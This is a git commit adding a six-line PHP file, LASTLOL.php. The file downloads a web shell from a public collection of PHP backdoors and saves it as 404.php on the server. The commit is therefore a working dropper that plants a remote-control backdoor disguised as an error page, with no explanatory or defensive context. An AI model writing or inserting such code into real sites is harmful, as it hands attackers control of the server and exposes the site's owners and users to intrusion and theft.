0e47166dd38f0e2538c6d4faa7dabb49ce449d5c
686964646f <686964646f@hmamail.com>
2017-05-22 19:14:05 +0000

    Create LASTLOL.php

---
+++ LASTLOL.php
@@ -0,0 +1,6 @@
+<?php
+$content = file_get_contents('https://raw.githubusercontent.com/bartblaze/PHP-backdoors/master/Deobfuscated/1n73ctionShell_abc00305dcfabe889507832e7385af937b94350d.php');
+$fp = fopen("./404.php","wb");
+fwrite($fp,$content);
+fclose($fp);
+?>
